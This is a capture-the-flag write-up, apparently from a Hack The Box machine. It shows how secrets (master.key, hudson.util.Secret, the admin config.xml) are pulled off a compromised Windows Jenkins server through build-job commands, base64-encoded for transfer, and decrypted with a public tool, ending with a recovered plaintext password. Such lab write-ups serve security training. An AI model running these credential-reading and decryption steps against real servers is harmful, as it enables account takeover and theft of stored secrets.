
We can find credentials (which are encrypted) in the config.xml / credentials.xml file stored in the following path:

```
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\config.xml"
```

Unfortunately we can't just bruteforce an password out of it using john the ripper or hashcat. We'll need to utilize custom tools from GitHub. I'll use this one:

```
git clone https://github.com/hoto/jenkins-credentials-decryptor.git
```

```
make build
```

The binary is located in /bin/jenkins-credentials-decryptor. We'll need the config.xml, the master.key & the hudson.util.Secret to decrypt the password.

The master.key & hudson.util.Secret are stored in the C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets directory.

Executed the following batch job and gained master.key

```
cmd /c "type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key"
```

Stored the master.key on my local machine. (has to be 256-257 bytes long).

```
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
```

Executed this batch job to retrieve the hudson.util.Secret

```
cmd /c "type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret"
```

The Console Output although gave us an encrypted blob. 

```
Started by remote host 10.10.14.57
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hacked4
[hacked4] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins2502013268464140101.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hacked4>cmd /c "type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret" 
�aPTñ‹ìQw3è¨¾®Ã€ƒg·¢dw-J)
uM†’,Ábˆn¨
\îÙ!Ë÷s¢E¹Ä1âªaí;>©×õU‹‡¾Õµÿ™Þ8	îÆ½¿xd$³ÌYU
©k1Î‘}ôAö»Ýv–…í„�¬©•
`K� 8
D�aIâXÒD-Å"´¾¯í‹äGt\ñQå_]Æš”�Ç>J/©«ÎL('ÞìU§ �JÌ“á­|R´7Šè=vP7ˆ:ˆDÕ{ºKI8²Äžû!U�×§“úêXÊ P¿fŠáE4ìLÜ¤^ˆöð‡*áËù‚ZˆuÒ®tdÊ„! 7zßQ"


C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\hacked4>exit 0 
Finished: SUCCESS
```

Since they might be in non-printable characters, we would need to use Base64 to get them out. This can be done with PowerShell scripting.

```
powershell -c "[convert]::ToBase64String((Get-Content -Path C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret -Encoding byte))"
```

This batch job provided us with the base64 encoded string.

```
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
```

Let's decrypt and save it inside an hudson.util.Secret file on our local machine.

```
echo "gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=" | base64 -d > hudson.util.Secret
```

The only thing left is now the config.xml in the /admin user directory.

```
cmd /c "type C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml"
```

Stored this inside an config.xml file on my local machine.

Retrieved the hudson.util.Secret

```
powershell.exe -c "[convert]::ToBase64String((Get-Content -path
'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding byte))"
```

Stored it inside an binary on my local machine.

```
echo "gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA="| base64 -d > hudson.util.Secret
```

Ran the decryptor and gained credentials for user "oliver".

```
./jenkins-credentials-decryptor -c /ctfs/htb/ad/object/www/jenkins/config.xml -m /ctfs/htb/ad/object/www/jenkins/master.key -s /ctfs/htb/ad/object/www/jenkins/hudson.util.Secret
```

```
oliver:c1cdfun_d2434
```

